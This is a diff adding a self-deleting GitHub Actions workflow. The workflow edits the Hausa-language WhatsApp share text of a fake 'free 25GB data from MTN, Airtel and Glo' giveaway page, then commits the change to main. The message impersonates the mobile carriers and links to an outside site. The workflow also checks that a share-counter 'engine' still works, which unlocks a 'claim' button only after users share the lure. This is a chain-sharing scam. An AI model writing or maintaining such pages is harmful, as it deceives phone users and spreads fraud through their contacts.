@@ -1,0 +1,60 @@
+name: Restore original share message structure
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - .github/workflows/restore-original-share-message.yml
+
+permissions:
+  contents: write
+
+jobs:
+  restore:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: main
+          fetch-depth: 0
+
+      - name: Restore share message only
+        shell: bash
+        run: |
+          python - <<'PY'
+          from pathlib import Path
+
+          files = [Path('index.html'), Path('Samu Kyautar 30GB Data A Kowane Layi.html')]
+          old = 'var text1 = "*MTN, AIRTEL DA GLO NA BADA KYAUTAR 25GB DATA*%0A%20%0A*Kamfanonin MTN, Airtel da Glo na bada kyautar 25GB data domin nuna farin cikinsu ga al’umma.*%0A%20%0A*Yadda zaku samu wannan kyautar data daga MTN, Airtel ko Glo.*%0A%20%0A*Ku shiga 👇*%0Ahttps://kluspz.com/25GB-Free-Anniversary-Data%0A%20%0A*Kowa%20Ya Nema Kafin Su Daina Badawa*",'
+          new = 'var text1 = "*MTN, AIRTEL DA GLO NA BADA KYAUTAR 25GB DATA NA MURNAR CIKA SHEKARA 25*%0A%20%0A*Kamfanonin MTN, Airtel da Glo na bada kyautar 25GB data na 25 years anniversary%20don nuna farin cikinsu ga alumma.*%0A%20%0A*Yadda zaku samu wannan kyautar data daga MTN, Airtel ko Glo.*%0A%20%0A*Ku shiga 👇*%0Ahttps://kluspz.com/25GB-Free-Anniversary-Data%0A%20%0A*Kowa%20Ya Nema Kafin Su Daina Badawa*",'
+
+          for p in files:
+              text = p.read_text(encoding='utf-8')
+              if old not in text:
+                  raise SystemExit(f'Expected current share message not found in {p}')
+              text = text.replace(old, new, 1)
+              p.write_text(text, encoding='utf-8')
+
+          if files[0].read_bytes() != files[1].read_bytes():
+              raise SystemExit('HTML files diverged')
+          PY
+
+      - name: Verify share engine unchanged
+        shell: bash
+        run: |
+          grep -q 'share = "whatsapp://send?text=" + text1;' index.html
+          grep -q 'if (width == 0)' index.html
+          grep -q 'width += 50' index.html
+          grep -q 'width += 15' index.html
+          grep -q 'localStorage.setItem(saved, width);' index.html
+          grep -q '$("#claim").fadeIn(1000);' index.html
+
+      - name: Commit and remove helper
+        shell: bash
+        run: |
+          rm -f .github/workflows/restore-original-share-message.yml
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "Restore original WhatsApp share message structure"
+          git push origin HEAD:main
